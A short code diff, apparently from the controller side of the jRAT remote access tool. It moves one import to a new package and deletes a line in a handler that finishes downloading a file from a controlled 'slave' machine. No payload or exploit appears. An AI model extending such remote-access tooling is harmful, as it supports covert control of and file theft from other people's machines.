@@ -3,7 +3,7 @@ package se.jrat.client.packets.incoming;
 import java.io.DataInputStream;
 
 import se.jrat.client.Slave;
-import se.jrat.client.ui.frames.PanelFileTransfer;
+import se.jrat.client.ui.panels.PanelFileTransfer;
 import se.jrat.common.io.FileCache;
 import se.jrat.common.io.TransferData;
 
@@ -18,7 +18,6 @@ public class Packet31CompleteServerDownload extends AbstractIncomingPacket {
 			data.getOutputStream().close();
 			TransferData dt = FileCache.get(slave);
 			FileCache.remove(slave);
-			PanelFileTransfer.instance.remove(dt);
 		}
 	}
 
